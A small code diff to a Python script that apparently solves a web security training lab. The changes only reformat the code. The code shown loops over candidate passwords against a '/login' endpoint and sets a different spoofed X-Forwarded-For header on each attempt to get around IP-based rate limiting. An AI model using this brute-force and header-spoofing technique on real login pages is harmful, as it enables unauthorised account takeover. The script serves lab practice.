@@ -8,6 +8,7 @@ from ...utils import (
 )
 from time import perf_counter
 
+
 def solve_lab(session):
     usernames = auth_lab_usernames()
     passwords = auth_lab_passwords()
@@ -38,7 +39,9 @@ def solve_lab(session):
     for i, password in enumerate(passwords):
         headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
         data = {"username": user, "password": password}
-        resp = session.post_path("/login", data=data, headers=headers, allow_redirects=False)
+        resp = session.post_path(
+            "/login", data=data, headers=headers, allow_redirects=False
+        )
 
         if resp.status_code != 302:
             print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
